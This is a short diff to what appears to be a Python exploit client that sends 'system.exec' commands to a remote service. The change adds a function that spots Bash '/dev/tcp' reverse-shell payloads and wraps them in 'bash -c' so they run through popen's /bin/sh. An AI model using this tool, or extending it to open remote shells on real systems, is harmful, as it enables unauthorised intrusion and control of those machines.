@@ -3,6 +3,7 @@
 import socket
 import os
 import select
+import shlex
 import sys
 import termios
 import time
@@ -79,6 +80,16 @@ def discover_lhost(rhost, rport):
         probe.close()
 
 
+def normalize_shell_command(command):
+    """Make common Bash /dev/tcp payloads work through popen's /bin/sh."""
+    stripped = command.strip()
+    is_dev_tcp = "/dev/tcp/" in stripped
+    is_direct_bash = stripped.startswith("bash -i ") or stripped.startswith("/bin/bash -i ")
+    if is_dev_tcp and is_direct_bash:
+        return "bash -c {}".format(shlex.quote(stripped))
+    return command
+
+
 class Remote:
     def __init__(self, rhost, rport):
         self._host = rhost
@@ -146,6 +157,7 @@ class Remote:
         self._sock.close()
 
     def shell_cmd(self, cmd):
+        cmd = normalize_shell_command(cmd)
         self.send(mk_cmd_arr(['system.exec', "{}".format(cmd)]))
         buf = self.recv()
         return buf
